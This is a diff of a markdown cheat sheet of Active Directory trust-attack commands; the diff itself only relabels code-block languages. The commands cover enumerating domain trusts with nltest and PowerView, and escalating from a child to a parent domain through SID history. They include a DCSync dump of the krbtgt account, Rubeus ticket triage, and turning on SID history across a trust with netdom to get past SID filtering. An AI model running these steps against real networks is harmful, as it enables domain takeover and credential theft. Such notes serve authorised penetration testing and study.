@@ -1,20 +1,20 @@
 * cmd
-```
+``` a
 nltest /trusted_domains
 ```
 * powershell
-```
+``` powershell
 ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
 ```
 * powerview
-```
+``` powershell
 Get-DomainTrust -API or Get-DomainTrust -NET
 Get-DomainTrustMapping
 Get-DomainForeignGroupMember -Domain [target domain]
 ```
 
 ## Bidirectional Parent/Child -- sids
-```
+``` a
 PowerShell Get-DomainGroup -Identity 'Domain Admins' -Domain [parent domain] | select ObjectSid
 Shell whoami /user
 DCSync krbtgt or lsadump::dcsync /user:krbtgt /domain:[child]
@@ -28,15 +28,15 @@ Rubeus triage
 ```
 
 * powerview
-```
+``` powershell
 Get-DomainSID -Domain [domain]
 ```
 ## SID filtering
-```
+``` powershell
 Get-DomainTrust -Domain [target domain]
 netdom trust [From] /d:[To] /enablesidhistory:yes  (This will add TREAT_AS_EXTERNAL to TrustAttributes)
 ```
 * Need to find a custom group in domain local security groups and change sids to this group
-```
+``` powershell
 Get-DomainGroupMember -Identity "Administrators" -Domain [target domain]
 ```
